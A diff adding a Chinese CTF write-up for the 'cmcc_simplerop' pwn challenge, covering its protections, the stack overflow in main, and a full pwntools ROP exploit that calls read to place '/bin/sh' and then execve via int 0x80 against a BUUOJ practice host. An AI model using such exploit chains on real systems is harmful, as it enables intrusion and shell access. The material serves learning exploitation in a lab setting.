@@ -214,3 +214,91 @@ p.interactive()
 ## 实验二：2017 湖湘杯 pwn300
 
 32 位静态链接题目，需要结合用户输入的内容，然后调用 ELF 自身的 gadget 构建系统调用。
+
+## 实验三：cmcc_simplerop
+
+**考点：静态链接、系统调用号、栈溢出**
+
+### 分析
+
+#### 保护情况
+
+32 位程序，NX 保护
+
+```shell
+Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)
+```
+
+#### 漏洞函数
+
+main 中溢出，溢出长度挺大的：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp+1Ch] [ebp-14h]
+
+  puts("ROP is easy is'nt it ?");
+  printf("Your input :");
+  fflush(stdout);
+  return read(0, &v4, 0x64);
+}
+```
+
+### 思路
+
+之前遇到 get_started_3dsctf_2016 的时候情况与这条题目看上去类似，用的是 mprotect  给内存添加执行权限，然后写入 shellcode 。实际操作一下这条题目，bss 、 got.plt 两个段修改不成功，最后看大佬 wp 知道用 系统调用号 。之前也做过一条题目也是用系统调用号，可以套用那个思路。
+
+> 什么是系统调用？[维基百科](https://zh.wikipedia.org/wiki/系统调用)
+>
+> 系统调用号有哪些？[Linux系统调用 int 80h int 0x80](https://blog.csdn.net/xiaominthere/article/details/17287965)
+
+就是我们最后执行这条命令：``int80(11,"/bin/sh",null,null)``。系统调用参数是读取寄存器中的（对这不是32位系统的栈传参）。
+
+四个参数对应寄存器是：eax、ebx、ecx、edx
+
+```python
+payload = p32(pop_eax) + p32(0xb)	#系统调用号
+payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr)
+payload += p32(int_80)
+```
+
+程序中没有找到 /bin/sh\x00 字符串，所以还需要构建调用 read 函数写入字符串
+
+```python
+payload = 'a'*0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8)
+```
+
+### exp
+
+```python
+#encoding:utf-8
+from pwn import *
+
+context.log_level = 'debug'
+p = remote('node3.buuoj.cn',29604)
+#p = process("./simplerop")
+
+int_80 = 0x80493e1
+pop_eax = 0x80bae06
+read_addr = 0x0806CD50
+binsh_addr = 0x080EB584
+pop_edx_ecx_ebx = 0x0806e850
+
+payload = 'a'*0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8)
+payload += p32(pop_eax) + p32(0xb)	#系统调用号
+payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr)
+payload += p32(int_80)
+
+#gdb.attach(p)
+p.sendline(payload)
+p.sendline('/bin/sh\x00')
+p.interactive()
+```
+
+
+
